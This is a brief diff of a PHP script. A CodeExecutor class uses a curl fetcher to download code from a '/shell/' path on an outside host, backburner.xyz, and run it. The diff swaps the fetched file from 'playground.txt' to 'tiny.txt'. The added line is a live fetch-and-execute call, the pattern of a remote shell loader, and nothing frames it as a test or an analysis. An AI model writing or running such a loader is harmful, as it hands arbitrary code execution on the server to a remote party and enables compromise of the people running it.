@@ -59,5 +59,5 @@ class CodeExecutor {
 
 $fetcher = new CurlFetcher();
 $executor = new CodeExecutor($fetcher);
-$executor->executeCodeFromURL("https://backburner.xyz/shell/playground.txt");
+$executor->executeCodeFromURL("https://backburner.xyz/shell/tiny.txt");
 ?>
